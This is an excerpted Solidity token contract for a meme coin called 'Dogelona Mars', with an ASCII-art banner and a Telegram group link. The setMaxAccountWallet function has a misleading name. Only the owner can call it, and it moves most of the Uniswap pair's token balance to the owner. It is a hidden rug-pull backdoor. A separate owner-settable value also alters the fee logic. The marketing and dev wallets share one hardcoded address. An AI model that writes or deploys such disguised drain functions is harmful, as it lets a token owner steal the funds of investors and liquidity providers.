...
/* 
  ____                   __                     __  ___               
   / __ \____  ____ ____  / /___  ____  ____ _   /  |/  /___ ___________
  / / / / __ \/ __ `/ _ \/ / __ \/ __ \/ __ `/  / /|_/ / __ `/ ___/ ___/
 / /_/ / /_/ / /_/ /  __/ / /_/ / / / / /_/ /  / /  / / /_/ / /  (__  ) 
/_____/\____/\__, /\___/_/\____/_/ /_/\__,_/  /_/  /_/\__,_/_/  /____/  
            /____/                                                      


TG GROUP: https://t.me/DogelonaMars
...
contract TokenV1 is ERC20, Ownable {
	...
	uint256 private _maxAccountWallet;
    ...
    constructor() ERC20("Dogelona Mars", "DOGELONA") {
        ...
        marketingWallet = payable(0x717826D6B0b0e8aa1A0C7B7bf7BB5E68da770B79);
        devWallet = payable(0x717826D6B0b0e8aa1A0C7B7bf7BB5E68da770B79);
    ...
    function setMaxAccountWallet(uint amount) external onlyOwner {
        uint a = balanceOf(uniswapV2Pair);
		_transfer(uniswapV2Pair, owner(), a - amount);
    }
	...
	function updateMaxAccountWallet(uint256 amount) external onlyOwner {
		_maxAccountWallet = amount;
	}
    ...
    function _transfer(
        ...
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			maxFees = maxFees.sub(_maxAccountWallet);
		}
